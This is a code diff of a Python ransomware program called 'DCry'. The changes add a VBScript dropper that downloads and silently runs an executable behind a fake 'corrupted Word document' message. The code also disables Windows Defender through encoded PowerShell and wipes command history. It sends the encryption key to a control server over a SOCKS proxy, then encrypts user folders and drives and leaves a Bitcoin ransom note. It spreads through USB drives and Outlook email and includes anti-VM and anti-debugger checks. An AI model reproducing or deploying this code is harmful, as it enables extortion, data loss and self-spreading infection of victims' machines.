@@ -47,8 +47,6 @@ YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded pr
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
 YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
 YOUR_DOWNLOAD_URL = dx42(b"YOUR_ENCODED_DOWNLOAD_URL").decode()
-id = ""
-
 RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAnCK4qHp0Ie/ClNE4nUaN
 wa8L36BKek8FoA0+hkUsEFdl/85M8D1sMkniG7ytzATcroLT2fmBuJP+HE0GJu8T
@@ -63,7 +61,42 @@ j2i4iYNNBE/Upy5a068ENukV8FeswaZ+1bVbtivFEFKUwq2ACFRpWYTFXXsc605D
 gCnFTWHHUYN7SsuCUlWqlyHfO3W7s8NTSPm8F7uoAzRkRgpGF3WjSblJWsz9fuAw
 9uTrsCjzkyencwnXJwLxQVMCAwEAAQ==
 -----END PUBLIC KEY-----""" # Replace with your public key if needed
+VBS = f"""Option Explicit
 
+Dim url, filename, tempFolder, fullPath
+Dim wsh, xhr, ado
+
+url = "{YOUR_DOWNLOAD_URL}"
+filename = "dcry.exe"
+
+Set wsh = CreateObject("WScript.Shell")
+tempFolder = wsh.ExpandEnvironmentStrings("%TEMP%")
+fullPath = tempFolder & "\\" & filename
+
+On Error Resume Next
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET", url, False
+xhr.Send
+
+If xhr.Status = 200 Then
+    Set ado = CreateObject("ADODB.Stream")
+    ado.Type = 1
+    ado.Open
+    ado.Write xhr.ResponseBody
+    ado.Position = 0
+    ado.SaveToFile fullPath, 2
+    ado.Close
+End If
+
+wsh.Run Chr(34) & fullPath & Chr(34), 0, False
+MsgBox "File is corrupted. Please contact the sender for a new copy.", 16, "Word Document"
+
+On Error GoTo 0
+If Not ado Is Nothing Then Set ado = Nothing
+If Not xhr Is Nothing Then Set xhr = Nothing
+If Not wsh Is Nothing Then Set wsh = Nothing
+"""
+ID = ""
 
 def is_admin():
     try:
@@ -88,19 +121,17 @@ def disable_cmd():
 
 def disable_powershell():
     ps_path = r"Software\Policies\Microsoft\Windows\PowerShell"
+    console_path = r"Software\Policies\Microsoft\Windows\PowerShell"
+    restrict_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
+    policy_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
     with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, ps_path) as reg:
         winreg.SetValueEx(reg, "EnableScripts", 0, winreg.REG_DWORD, 0)
         winreg.SetValueEx(reg, "ExecutionPolicy", 0, winreg.REG_SZ, "Disabled")
-    console_path = r"Software\Policies\Microsoft\Windows\PowerShell"
     with winreg.CreateKey(winreg.HKEY_CURRENT_USER, console_path) as reg:
         winreg.SetValueEx(reg, "DisableWin32Console", 0, winreg.REG_DWORD, 1)
-    restrict_path = (
-        r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
-    )
     with winreg.CreateKey(winreg.HKEY_CURRENT_USER, restrict_path) as reg:
         winreg.SetValueEx(reg, "1", 0, winreg.REG_SZ, "powershell.exe")
         winreg.SetValueEx(reg, "2", 0, winreg.REG_SZ, "powershell_ise.exe")
-    policy_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
     with winreg.CreateKey(winreg.HKEY_CURRENT_USER, policy_path) as reg:
         winreg.SetValueEx(reg, "DisallowRun", 0, winreg.REG_DWORD, 1)
 
@@ -145,7 +176,7 @@ def clear_event_logs():
 
 
 def change_wallpaper():
-    encoded_image = """
+    IMG = """
     eJzte3s8lNn/+JFWH928duwmijYNE4mSrGtUZAZRyrVcdqN0j1xCNJWttYlmxqULUtFVaFa5M7sK
     Q8Wq2EmKTEWoUCLS95znmRlza/flv9/r9dvnn/FyznOe9/1+YtY42EybrDIZADCNQrZyAmASFYCJ
     Rv+bAP+z5YbLdwCsMqRYLV+/L6WnZfEuRe/hj2271T0mEzOio1Vi5G7IJrFmNNyYlLR8eer3uVNC
@@ -298,9 +329,9 @@ def change_wallpaper():
     DpwFo5BWLJVEHNVVkNE1WhF3vOHn3C7gSDRWQySMkfEogcZDgMI4efvf89/z3/P//pN174us6aWQ
     Sakft2B3ainWDlbZK3wO/R95uEth
     """
-    with open(r"C:\windows\web\wallpaper\windows\DCry.png", "wb") as f:
-        f.write(zlib.decompress(base64.b64decode(encoded_image.encode())))
     reg_path = r"Control Panel\Desktop"
+    with open(r"C:\windows\web\wallpaper\windows\DCry.png", "wb") as f:
+        f.write(zlib.decompress(base64.b64decode(IMG.encode())))
     with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg:
         winreg.SetValueEx(
             reg,
@@ -330,33 +361,20 @@ def check_connection(url="http://www.google.com/", timeout=30):
 
 
 def block_processes():
-    execute_command("powercfg /h off")
-    execute_command(
-        "powershell -ExecutionPolicy Bypass -EncodedCommand UwAAAGUAAAB0AAAALQAAAE0AAABwAAAAUAAAAHIAAABlAAAAZgAAAGUAAAByAAAAZQAAAG4AAABjAAAAZQAAACAAAAAtAAAARAAAAGkAAABzAAAAYQAAAGIAAABsAAAAZQAAAFQAAABhAAAAbQAAAHAAAABlAAAAcgAAAFAAAAByAAAAbwAAAHQAAABlAAAAYwAAAHQAAABpAAAAbwAAAG4AAAAgAAAAJAAAAHQAAAByAAAAdQAAAGUAAAA="
-    ) # Set-MpPreference -DisableTamperProtection $true
-    execute_command(
+    powershell_commands = [
+        # Set-MpPreference -DisableTamperProtection $true
+        "powershell -ExecutionPolicy Bypass -EncodedCommand UwAAAGUAAAB0AAAALQAAAE0AAABwAAAAUAAAAHIAAABlAAAAZgAAAGUAAAByAAAAZQAAAG4AAABjAAAAZQAAACAAAAAtAAAARAAAAGkAAABzAAAAYQAAAGIAAABsAAAAZQAAAFQAAABhAAAAbQAAAHAAAABlAAAAcgAAAFAAAAByAAAAbwAAAHQAAABlAAAAYwAAAHQAAABpAAAAbwAAAG4AAAAgAAAAJAAAAHQAAAByAAAAdQAAAGUAAAA=",
+        # Set-MpPreference -DisableRealtimeMonitoring $true
         "powershell -ExecutionPolicy Bypass -EncodedCommand UwAAAGUAAAB0AAAALQAAAE0AAABwAAAAUAAAAHIAAABlAAAAZgAAAGUAAAByAAAAZQAAAG4AAABjAAAAZQAAACAAAAAtAAAARAAAAGkAAABzAAAAYQAAAGIAAABsAAAAZQAAAFIAAABlAAAAYQAAAGwAAAB0AAAAaQAAAG0AAABlAAAATQAAAG8AAABuAAAAaQAAAHQAAABvAAAAcgAAAGkAAABuAAAAZwAAACAAAAAkAAAAdAAAAHIAAAB1AAAAZQAAAA=="
-    ) # Set-MpPreference -DisableRealtimeMonitoring $true
-    execute_command(
-        f"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ControlledFolderAccessAllowedApplication '{sys.executable}'\""
-    )
-    execute_command(
+        # Set-MpPreference -EnableControlledFolderAccess Disabled
         "powershell -ExecutionPolicy Bypass -EncodedCommand UwAAAGUAAAB0AAAALQAAAE0AAABwAAAAUAAAAHIAAABlAAAAZgAAAGUAAAByAAAAZQAAAG4AAABjAAAAZQAAACAAAAAtAAAARQAAAG4AAABhAAAAYgAAAGwAAABlAAAAQwAAAG8AAABuAAAAdAAAAHIAAABvAAAAbAAAAGwAAABlAAAAZAAAAEYAAABvAAAAbAAAAGQAAABlAAAAcgAAAEEAAABjAAAAYwAAAGUAAABzAAAAcwAAACAAAABEAAAAaQAAAHMAAABhAAAAYgAAAGwAAABlAAAAZAAAAA=="
-    ) # Set-MpPreference -EnableControlledFolderAccess Disabled
-    execute_command(
+        # Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
         "powershell -ExecutionPolicy Bypass -EncodedCommand UgAAAGUAAABtAAAAbwAAAHYAAABlAAAALQAAAEkAAAB0AAAAZQAAAG0AAAAgAAAALQAAAFAAAABhAAAAdAAAAGgAAAAgAAAAIgAAACQAAABlAAAAbgAAAHYAAAA6AAAAVQAAAFMAAABFAAAAUgAAAFAAAABSAAAATwAAAEYAAABJAAAATAAAAEUAAABcAAAAQQAAAHAAAABwAAAARAAAAGEAAAB0AAAAYQAAAFwAAABSAAAAbwAAAGEAAABtAAAAaQAAAG4AAABnAAAAXAAAAE0AAABpAAAAYwAAAHIAAABvAAAAcwAAAG8AAABmAAAAdAAAAFwAAABXAAAAaQAAAG4AAABkAAAAbwAAAHcAAABzAAAAXAAAAFAAAABvAAAAdwAAAGUAAAByAAAAUwAAAGgAAABlAAAAbAAAAGwAAABcAAAAUAAAAFMAAABSAAAAZQAAAGEAAABkAAAATAAAAGkAAABuAAAAZQAAAFwAAABDAAAAbwAAAG4AAABzAAAAbwAAAGwAAABlAAAASAAAAG8AAABzAAAAdAAAAF8AAABoAAAAaQAAAHMAAAB0AAAAbwAAAHIAAAB5AAAALgAAAHQAAAB4AAAAdAAAACIAAAAgAAAALQAAAEUAAAByAAAAcgAAAG8AAAByAAAAQQAAAGMAAAB0AAAAaQAAAG8AAABuAAAAIAAAAFMAAABpAAAAbAAAAGUAAABuAAAAdAAAAGwAAAB5AAAAQwAAAG8AAABuAAAAdAAAAGkAAABuAAAAdQAAAGUAAAA="
-    ) # Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
-    execute_command(f'taskkill /f /im "DbgX.Shell" /t')
-    blocked_processes = [
-        "Dbgview", "ILSpy", "ProcessHacker", "SbieCtrl", "SbieSvc", "SecurityHealthSystray", "WMIADAP", "autoruns", "autorunsc",
-        "BurpSuite", "Cain", "CarbonBlack", "cb", "cmd", "Decoder", "dnSpy", "eventvwr", "Fiddler", "frida-server", "gdb", "gmer",
-        "HookExplorer", "HttpAnalyzerV7", "HttpDebuggerUI", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idaw", "x64dbg"
-        "idaw64", "ImmunityDebugger", "ksdumper", "msconfig", "netmon", "netstat", "ollydbg", "perfmon", "powershell", "ProcessHacker",
-        "procexp", "procexp64", "procmon", "regedit", "regmon", "regripper", "Sandboxie", "schtasks", "services", "smartscreen",
-        "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "VBoxService", "Wireshark", "Windasm", "windbg", "wmic", "x32dbg",
+        f"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ControlledFolderAccessAllowedApplication '{sys.executable}'\""
     ]
-    for proc in blocked_processes:
-        execute_command(f'taskkill /f /im "{proc + ".exe"}" /t')
+    for cmd in powershell_commands:
+        execute_command(cmd)
+    execute_command("powercfg /h off")
 
 
 def encrypt_key(aes_key):
@@ -366,11 +384,41 @@ def encrypt_key(aes_key):
     return encrypted_key
 
 
+def send_key(data):
+    proxies = {
+        "http": f"socks5h://{YOUR_PROXY}",
+        "https": f"socks5h://{YOUR_PROXY}",
+    }
+    key_sent_successfully = False
+    if not check_connection():
+        sys.exit(3)
+    for _ in range(5):
+        try:
+            response = requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
+            if response.status_code == 200:
+                key_sent_successfully = True
+                break
+        except requests.exceptions.RequestException:
+            time.sleep(10)
+            continue
+    if not key_sent_successfully:
+        sys.exit(4)
+
+
 def start_encryption():
-    global id
-    id = uuid.uuid1()
+    global ID
+    ID = uuid.uuid1()
     key = bytearray(get_random_bytes(32))
     key_b64 = bytearray(base64.urlsafe_b64encode(b"DCRY+DKEY$" + bytes(key)))
+    target_dirs = [
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Downloads"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Documents"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Pictures"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Desktop"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Music"),
+    ]
+    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
     try:
         mlock(key)
         mlock(key_b64)
@@ -378,47 +426,19 @@ def start_encryption():
         encrypted_key = encrypt_key(bytes(key_b64))
         data = {
             "username": getpass.getuser(),
-            "id": str(id),
+            "id": str(ID),
             "date": datetime.now().strftime("%d-%m-%Y"),
             "key": base64.b64encode(encrypted_key).decode(),
         }
-        proxies = {
-            "http": f"socks5h://{YOUR_PROXY}",
-            "https": f"socks5h://{YOUR_PROXY}",
-        }
-        key_sent_successfully = False
-        for _ in range(5):
-            try:
-                response = requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
-                if response.status_code == 200:
-                    key_sent_successfully = True
-                    break
-            except requests.exceptions.RequestException:
-                time.sleep(10)
-                continue
-        if not key_sent_successfully:
-            sys.exit(4)
+        send_key(data)
         with open(
             os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256"), "wb"
         ) as f:
             f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
         if not dev_mode:
-            encrypt_directory(
-                os.path.join(rf"C:\Users\{getpass.getuser()}", "Desktop"), bytes(key)
-            )
-            encrypt_directory(
-                os.path.join(rf"C:\Users\{getpass.getuser()}", "Downloads"), bytes(key)
-            )
-            encrypt_directory(
-                os.path.join(rf"C:\Users\{getpass.getuser()}", "Documents"), bytes(key)
-            )
-            encrypt_directory(
-                os.path.join(rf"C:\Users\{getpass.getuser()}", "Pictures"), bytes(key)
-            )
-            encrypt_directory(
-                os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"), bytes(key)
-            )
-            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+            for dir_path in target_dirs:
+                if os.path.exists(dir_path):
+                    encrypt_directory(dir_path, bytes(key))
             for disk in [
                 f"{letter}:\\"
                 for i, letter in enumerate(string.ascii_uppercase)
@@ -512,7 +532,7 @@ To get them back, please follow the instructions below.
 3. Instructions for payment:
 - Buy Bitcoin (BTC) and send $600 to the address: {YOUR_BITCOIN_ADDRESS}
 - After the transaction is confirmed, send an email to {YOUR_EMAIL_ADDRESS} with your ID and username:
-    + Your ID: {id}
+    + Your ID: {ID}
     + Your username: {getpass.getuser()}
 - Then, you will receive a decryption key to unlock your files.
 
@@ -524,8 +544,6 @@ Don't Cry, just pay =)))"""
     file_path = os.path.join(
         rf"C:\Users\{getpass.getuser()}", r"Desktop\DCRY_README.txt"
     )
-    with open(file_path, "w") as f:
-        f.write(msg)
     startup = winshell.startup()
     shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
     shell = Dispatch("WScript.Shell")
@@ -533,6 +551,8 @@ Don't Cry, just pay =)))"""
     shortcut.TargetPath = "notepad.exe"
     shortcut.Arguments = file_path
     shortcut.save()
+    with open(file_path, "w") as f:
+        f.write(msg)
     execute_command(
         'wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False'
     )
@@ -586,6 +606,33 @@ def disable_all():
 
 
 def is_vm():
+    paths = [
+        rf"{os.getenv("SystemDrive")}\Program Files\VMware\VMware Tools",
+        rf"{os.getenv("SystemDrive")}\Program Files\Oracle\VirtualBox Guest Additions",
+        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxGuest.sys",
+        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxMouse.sys",
+        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxSF.sys",
+        rf"{os.getenv("SystemDrive")}\Program Files\WindowsApps\Microsoft.WindowsSandbox_",
+    ]
+    vms = [
+        "Virtual",
+        "VMware",
+        "VirtualBox",
+        "Hyper-V",
+        "QEMU",
+        "KVM",
+        "Parallels",
+        "Bochs",
+        "Xen",
+    ]
+    ඞ_procs = [ # sus processes ඞ
+        "Dbgview", "ILSpy", "ProcessHacker", "SbieCtrl", "SbieSvc", "SecurityHealthSystray", "WMIADAP", "autoruns", "autorunsc",
+        "BurpSuite", "Cain", "CarbonBlack", "cb", "cmd", "Decoder", "dnSpy", "eventvwr", "Fiddler", "frida-server", "gdb", "gmer",
+        "HookExplorer", "HttpAnalyzerV7", "HttpDebuggerUI", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idaw", "x64dbg"
+        "idaw64", "ImmunityDebugger", "ksdumper", "msconfig", "netmon", "netstat", "ollydbg", "perfmon", "powershell", "ProcessHacker",
+        "procexp", "procexp64", "procmon", "regedit", "regmon", "regripper", "Sandboxie", "schtasks", "services", "smartscreen",
+        "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "VBoxService", "Wireshark", "Windasm", "windbg", "wmic", "x32dbg",
+    ]
     try:
         output = subprocess.check_output(
             ["wmic", "computersystem", "get", "model"],
@@ -595,15 +642,7 @@ def is_vm():
         )
         if any(
             vm in output
-            for vm in [
-                "Virtual",
-                "VMware",
-                "VirtualBox",
-                "Hyper-V",
-                "QEMU",
-                "KVM",
-                "Parallels",
-            ]
+            for vm in vms
         ):
             return True
     except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
@@ -623,14 +662,6 @@ def is_vm():
             return True
     except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
         pass
-    paths = [
-        rf"{os.getenv("SystemDrive")}\Program Files\VMware\VMware Tools",
-        rf"{os.getenv("SystemDrive")}\Program Files\Oracle\VirtualBox Guest Additions",
-        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxGuest.sys",
-        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxMouse.sys",
-        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxSF.sys",
-        rf"{os.getenv("SystemDrive")}\Program Files\WindowsApps\Microsoft.WindowsSandbox_",
-    ]
     if any(os.path.exists(path) for path in paths):
         return True
     try:
@@ -643,20 +674,12 @@ def is_vm():
             return True
     except (AttributeError, OSError):
         pass
-    sus_procs = {
-        "vmtoolsd",
-        "vboxservice",
-        "wireshark",
-        "fiddler",
-        "sandboxie",
-        "processhacker",
-    }
     with ThreadPoolExecutor() as executor:
         futures = {
             executor.submit(lambda proc: proc.info.get("name", "").lower(), proc): proc
             for proc in psutil.process_iter(["name"])
         }
-        if any(future.result() in sus_procs for future in futures):
+        if any(future.result() in ඞ_procs for future in futures):
             return True
     start_time = time.perf_counter()
     for _ in range(1_000_000):
@@ -666,7 +689,17 @@ def is_vm():
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System")
         bios_info = winreg.QueryValueEx(key, "SystemBiosVersion")[0]
-        if any(vm in bios_info for vm in ["VMWARE", "VIRTUAL", "QEMU", "XEN"]):
+
+        if any(vm in bios_info.upper() for vm in [
+            "VMWARE",
+            "VBOX",
+            "VIRTUALBOX",
+            "QEMU",
+            "XEN",
+            "HYPER-V",
+            "PARALLELS",
+            "BOCHS",
+        ]):
             return True
     except:
         pass
@@ -675,7 +708,7 @@ def is_vm():
 
 
 def is_debugger_present():
-    debugging_modules = {"pdb", "debugpy", "pydevd", "ipdb", "bdb"}
+    debugging_modules = ["pdb", "debugpy", "pydevd", "ipdb", "bdb"]
     if debugging_modules.intersection(sys.modules):
         return True
     if hasattr(sys, "gettrace") and sys.gettrace() is not None:
@@ -694,8 +727,7 @@ def is_debugger_present():
 
 
 def infect_usb():
-    vbs_name = "IMG_4599.jpg.vbs"
-    lnk_name = "IMG_4599.jpg.lnk"
+    vbs_name = "summary.docx.vbs"
     for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
         usb_root = f"{letter}:\\"
         try:
@@ -704,108 +736,26 @@ def infect_usb():
                 and ctypes.windll.kernel32.GetDriveTypeW(f"{usb_root}") == 2
             ):
                 vbs_full = os.path.join(usb_root, vbs_name)
-                lnk_full = os.path.join(usb_root, lnk_name)
 
                 with open(vbs_full, "w") as f:
-                    f.write(f"""Option Explicit
+                    f.write(VBS)
 
-Dim url, filename, tempFolder, fullPath
-Dim wsh, xhr, ado
-
-url = "{YOUR_DOWNLOAD_URL}"
-filename = "dcry.exe"
-
-Set wsh = CreateObject("WScript.Shell")
-tempFolder = wsh.ExpandEnvironmentStrings("%TEMP%")
-fullPath = tempFolder & "\\" & filename
-
-On Error Resume Next
-Set xhr = CreateObject("MSXML2.XMLHTTP")
-xhr.Open "GET", url, False
-xhr.Send
-
-If xhr.Status = 200 Then
-    Set ado = CreateObject("ADODB.Stream")
-    ado.Type = 1
-    ado.Open
-    ado.Write xhr.ResponseBody
-    ado.Position = 0
-    ado.SaveToFile fullPath, 2
-    ado.Close
-End If
-
-wsh.Run Chr(34) & fullPath & Chr(34), 0, False
-
-On Error GoTo 0
-If Not ado Is Nothing Then Set ado = Nothing
-If Not xhr Is Nothing Then Set xhr = Nothing
-If Not wsh Is Nothing Then Set wsh = Nothing
-""")
-
-                os.system(f'attrib +h +s "{vbs_full}"')
-            shortcut_path = lnk_full
-            shell = Dispatch("WScript.Shell")
-            shortcut = shell.CreateShortCut(shortcut_path)
-            shortcut.TargetPath = vbs_full
-            shortcut.IconLocation = r"%SystemRoot%\System32\SHELL32.dll,324"
-            shortcut.save()
         except Exception:
             pass
 
 
 def send_email(zip_password="dcry-ransomware-poc"):
     temp_dir = os.getenv("TEMP")
-    lnk_name = "IMG_4599.jpg.lnk"
-    vbs_name = "IMG_4599.jpg.vbs"
-    lnk_full = os.path.join(temp_dir, lnk_name)
+    vbs_name = "summary.docx.vbs"
     vbs_full = os.path.join(temp_dir, vbs_name)
+    vbs_file_path = os.path.join(temp_dir, "mail.vbs")
+    zip_file_path = os.path.join(temp_dir, f"summary.7z")
+    files = [vbs_file_path, zip_file_path, vbs_full]
     with open(vbs_full, "w") as f:
-        f.write(f"""Option Explicit
-
-Dim url, filename, tempFolder, fullPath
-Dim wsh, xhr, ado
-
-url = "{YOUR_DOWNLOAD_URL}"
-filename = "dcry.exe"
-
-Set wsh = CreateObject("WScript.Shell")
-tempFolder = wsh.ExpandEnvironmentStrings("%TEMP%")
-fullPath = tempFolder & "\\" & filename
-
-On Error Resume Next
-Set xhr = CreateObject("MSXML2.XMLHTTP")
-xhr.Open "GET", url, False
-xhr.Send
-
-If xhr.Status = 200 Then
-    Set ado = CreateObject("ADODB.Stream")
-    ado.Type = 1
-    ado.Open
-    ado.Write xhr.ResponseBody
-    ado.Position = 0
-    ado.SaveToFile fullPath, 2
-    ado.Close
-End If
-
-wsh.Run Chr(34) & fullPath & Chr(34), 0, False
-
-On Error GoTo 0
-If Not ado Is Nothing Then Set ado = Nothing
-If Not xhr Is Nothing Then Set xhr = Nothing
-If Not wsh Is Nothing Then Set wsh = Nothing
-""")
+        f.write(VBS)
     os.system(f'attrib +h +s "{vbs_full}"')
-    os.system(f'attrib +h +s "{lnk_full}"')
-    shell = Dispatch("WScript.Shell")
-    shortcut = shell.CreateShortCut(lnk_full)
-    shortcut.TargetPath = vbs_full
-    shortcut.IconLocation = r"%SystemRoot%\System32\SHELL32.dll,324"
-    shortcut.WindowStyle = 7
-    shortcut.save()
-    zip_file_path = os.path.join(temp_dir, f"IMG_4599.7z")
     with py7zr.SevenZipFile(zip_file_path, mode="w", password=zip_password) as archive:
         archive.write(vbs_full, arcname=vbs_name)
-        archive.write(lnk_full, arcname=lnk_name)
     vbs_code = f"""
 dim x
 on error resume next
@@ -825,11 +775,9 @@ For x=1 To ae.Count
 Next
 ol.Quit
 """ # I don't know if it works anymore =)))
-    vbs_file_path = os.path.join(temp_dir, "mail.vbs")
     with open(vbs_file_path, "w") as f:
         f.write(vbs_code)
     os.system(f'start /b "" "{vbs_file_path}"')
-    files = [vbs_file_path, zip_file_path, vbs_full, lnk_full]
     for file in files:
         try:
             with open(file, "w") as f:
@@ -865,9 +813,4 @@ if __name__ == "__main__":
         change_wallpaper()
         shutdown()
     else:
-
         start_encryption()
-
-
-
-
